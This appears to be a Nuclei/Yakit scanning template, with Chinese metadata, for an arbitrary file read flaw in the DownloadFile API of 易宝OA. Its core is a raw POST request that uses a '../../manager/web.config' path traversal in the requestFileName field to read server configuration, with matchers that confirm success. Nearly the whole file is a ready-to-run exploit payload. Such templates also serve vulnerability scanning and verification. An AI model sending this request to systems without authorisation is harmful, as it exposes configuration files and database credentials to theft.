content:
id: 易宝OA DownloadFile 任意文件读取漏洞

info:
  name: 易宝OA DownloadFile 任意文件读取漏洞
  author: Deans
  severity: high
  description: DownloadFile接口处存在任意文件读取漏洞，未授权的攻击者可以利用此漏洞读取系统内部敏感配置文件，数据库密钥凭证等，使系统处于极不安全的状态。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: cf27d533fdc25a018279154536b0baf0

http:
- raw:
  - |-
    @timeout: 30s
    POST /api/files/DownloadFile HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
    Accept-Encoding: gzip
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 93

    token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"data"'
    - '"message"'
    - '"is_succeed":'
    condition: and
